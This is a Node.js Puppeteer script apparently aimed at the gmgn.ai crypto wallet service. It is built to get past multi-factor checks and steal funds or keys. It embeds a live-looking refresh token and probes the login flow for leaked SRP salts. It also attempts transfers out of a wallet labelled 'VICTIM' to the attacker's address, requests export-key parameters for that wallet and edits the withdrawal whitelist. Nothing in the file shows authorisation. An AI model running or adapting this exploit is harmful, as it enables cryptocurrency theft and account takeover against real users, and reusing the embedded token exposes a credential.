const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const ORIG_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQ5NDg4LCJpYXQiOjE3ODQxNTc0ODgsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTgxMWFhNjUtODg1Mi00MTVjLWFmNTAtNTk2ZjcxMmM1MmJhIiwibmJmIjoxNzg0MTU3NDg4LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.KNxifpPUukpBroGap6hYIWrPKPwLiiv8xRCZx5zpRCI7FJdXSdhVSnjxSnuqkETXZyCvKMV2qxPBSpovwWaDCQ';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';
const PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&fp_did=4e8cc7f90484bd356291ff79db6b9b09&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';
const OUR_SOL = 'FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8';

(async () => {
    console.log('🔥 DIGGING DEEPER — TG SESSION + TRANSFER BYPASS');
    
    const browser = await puppeteer.launch({headless: 'new', args: ['--no-sandbox']});
    const page = await browser.newPage();
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 25000});
    await new Promise(r => setTimeout(r, 4000));
    
    const result = await page.evaluate(async (refresh, params, target, ourSol) => {
        const log = [];
        try {
        
        // Token
        let r = await fetch('/account/account/refresh_access_token', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({refresh_token: refresh})
        });
        let text = await r.text();
        let data;
        try { data = JSON.parse(text); } catch(e) { return {error: 'non-json response', text: text.substring(0,200)}; }
        if (data.code !== 0) return {error: 'token fail', data};
        const token = data.data.data.token;
        const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
        log.push('✅ Token OK');
        
        // ====== TG LOGIN: Get FULL response from step 2 ======
        log.push('=== TG LOGIN FULL FLOW ===');
        
        r = await fetch('/account/login_v3?device_id=tg456&client_id=gmgn_tg_bot&from_app=tg', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({account: 'foxtest@proton.me', account_type: 'email'})
        });
        data = await r.json();
        const sessionId = data.data?.session_id;
        log.push('Step 1 session: ' + sessionId);
        
        if (sessionId) {
            // Step 2: What does it return? Full response!
            r = await fetch('/account/login_v3?device_id=tg456&client_id=gmgn_tg_bot&from_app=tg', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({session_id: sessionId, step: 2})
            });
            data = await r.json();
            log.push('Step 2 FULL: ' + JSON.stringify(data).substring(0, 500));
            
            // Does it have salt/srp_B? That's the SRP exchange
            if (data.data?.salt || data.data?.data?.salt) {
                log.push('💀 SRP SALT LEAKED: ' + (data.data?.salt || data.data?.data?.salt));
            }
        }
        
        // ====== TRANSFER FROM OUR OWN WALLET (MFA bypass) ======
        log.push('=== TRANSFER MFA FROM OUR WALLET ===');
        
        // The whitelist error was for the NEW wallet we created
        // Let's try with OUR ORIGINAL wallet (proven to have verify_items: [])
        r = await fetch('/wallet-api/v1/generate_mfa_params?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({
                usage: 'transfer',
                biz_params: {
                    transfer_id: '888', transfer_type: '888',
                    chain: 'sol', from_address: ourSol,
                    to_address: target, amount: '1', amount_txt: '0.000000001',
                    token_address: 'So11111111111111111111111111111111111111112', symbol: 'SOL'
                }
            })
        });
        data = await r.json();
        log.push('Transfer MFA (our wallet): ' + data.code + ' ' + (data.message||''));
        if (data.code === 0) {
            log.push('verify_items: ' + JSON.stringify(data.data?.verify_items));
            log.push('txn_id: ' + data.data?.txn_id);
            
            if (!data.data?.verify_items?.length) {
                log.push('💀💀💀 TRANSFER MFA BYPASS CONFIRMED — verify_items EMPTY!');
                const transferTxn = data.data.txn_id;
                
                // Now try to actually transfer (will fail with balance but proves the point)
                r = await fetch('/wallet-api/v1/transfer?' + params, {
                    method: 'POST', headers: h,
                    body: JSON.stringify({
                        txn_id: transferTxn,
                        chain: 'sol', from_address: ourSol,
                        to_address: target, amount: '1', amount_txt: '0.000000001',
                        token_address: 'So11111111111111111111111111111111111111112', symbol: 'SOL'
                    })
                });
                data = await r.json();
                log.push('TRANSFER ATTEMPT: ' + data.code + ' ' + (data.message||''));
                
                if (data.code === 0) {
                    log.push('💀💀💀💀💀 TRANSFER SUCCEEDED!!!');
                } else if (data.message?.includes('balance') || data.message?.includes('insufficient')) {
                    log.push('💀 Transfer failed ONLY due to balance — NOT auth!');
                    log.push('MFA BYPASS + TRANSFER = FULLY PROVEN');
                }
            }
        }
        
        // ====== TRANSFER FROM VICTIM WALLET (the real IDOR test) ======
        log.push('=== TRANSFER FROM VICTIM WALLET ===');
        
        r = await fetch('/wallet-api/v1/generate_mfa_params?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({
                usage: 'transfer',
                biz_params: {
                    transfer_id: '999', transfer_type: '999',
                    chain: 'sol', from_address: target,
                    to_address: ourSol, amount: '1', amount_txt: '0.000000001',
                    token_address: 'So11111111111111111111111111111111111111112', symbol: 'SOL'
                }
            })
        });
        data = await r.json();
        log.push('Transfer MFA (VICTIM wallet): ' + data.code + ' ' + (data.message||''));
        
        // ====== EXPORT KEY for victim wallet ======
        log.push('=== EXPORT KEY ===');
        
        r = await fetch('/wallet-api/v1/generate_mfa_params?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({
                usage: 'export_key',
                biz_params: {address: target, chain: 'sol'}
            })
        });
        data = await r.json();
        log.push('export_key MFA: ' + data.code + ' ' + (data.message||''));
        if (data.code === 0) {
            log.push('💀 EXPORT KEY MFA: ' + JSON.stringify(data.data));
        }
        
        // ====== GET WHITELIST (check what addresses are whitelisted) ======
        log.push('=== WHITELIST ===');
        
        r = await fetch('/wallet-api/v1/get_whitelist_address?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({chain: 'sol'})
        });
        data = await r.json();
        log.push('whitelist: ' + JSON.stringify(data).substring(0, 300));
        
        // ====== SET WHITELIST (add victim as whitelist) ======
        log.push('=== SET WHITELIST ===');
        r = await fetch('/wallet-api/v1/set_whitelist_address?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({chain: 'sol', address: target, label: 'test'})
        });
        data = await r.json();
        log.push('set_whitelist: ' + data.code + ' ' + (data.message||''));
        
        return {log};
        } catch(err) { return {error: err.message, log}; }
    }, ORIG_REFRESH, PARAMS, TARGET, OUR_SOL);
    
    console.log(JSON.stringify(result, null, 2));
    await browser.close();
})();
